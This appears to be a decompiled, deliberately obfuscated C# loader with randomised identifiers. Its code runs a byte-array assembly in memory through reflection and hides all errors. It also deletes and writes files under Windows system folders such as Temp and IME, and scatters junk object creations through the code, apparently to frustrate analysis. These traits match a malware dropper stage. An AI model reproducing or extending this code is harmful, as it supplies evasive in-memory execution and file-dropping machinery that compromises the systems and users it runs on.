using System;
using System.Globalization;
using System.IO;
using System.Reflection;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Permissions;
using System.Text;
using System.Threading;

internal class K4DRvly
{
	public static string dkTJzfrY = Path.GetPathRoot(Path.GetTempPath());

	public static string RuV1km = Path.Combine(Path.GetPathRoot(Path.GetTempPath()), "Windows");

	public static string bnaICjjw = Path.Combine(RuV1km, "Temp");

	public static string wFY9Fvwu = Path.Combine(RuV1km, "IME");

	public static string ZiwgSWGj(byte[] rawData)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		using SHA256 sHA = SHA256.Create();
		new DataMisalignedException();
		new Version();
		new ApplicationException();
		byte[] array = sHA.ComputeHash(rawData);
		new RSAPKCS1SignatureFormatter();
		new HijriCalendar();
		new GacIdentityPermission();
		new RSAOAEPKeyExchangeDeformatter();
		new X509Certificate();
		new UTF8Encoding();
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	public static void qhsy82aSN(byte[] gZrZN92UZi)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			new AppDomainUnloadedException();
			new BadImageFormatException();
			new DSASignatureFormatter();
			new SignatureDescription();
			Assembly assembly = AppDomain.CurrentDomain.Load(gZrZN92UZi);
			new SecurityException();
			new CryptoKeySecurity();
			MethodInfo entryPoint = assembly.EntryPoint;
			new AmbiguousMatchException();
			new CryptoConfig();
			object obj = assembly.CreateInstance(entryPoint.Name);
			object[] parameters = new object[1];
			if (entryPoint.GetParameters().Length == 0)
			{
				parameters = null;
			}
			entryPoint.Invoke(obj, parameters);
		}
		catch
		{
		}
	}

	public static void vQzO0NqMOPT_A2(string targetfilename, string content)
	{
		if (targetfilename.StartsWith(Path.GetPathRoot(Path.GetTempPath())))
		{
			string directoryName = Path.GetDirectoryName(targetfilename);
			if (!Directory.Exists(directoryName))
			{
				Directory.CreateDirectory(directoryName);
			}
		}
		new FromBase64Transform();
		new TaiwanLunisolarCalendar();
		new JapaneseCalendar();
		new HMACSHA1();
		new ApplicationException();
		new CryptoConfig();
		new SynchronizationContext();
		new AmbiguousMatchException();
		new TargetParameterCountException();
		new FieldAccessException();
		new ApplicationException();
		if (File.Exists(targetfilename))
		{
			File.Delete(targetfilename);
		}
		File.WriteAllText(targetfilename, content);
	}
}
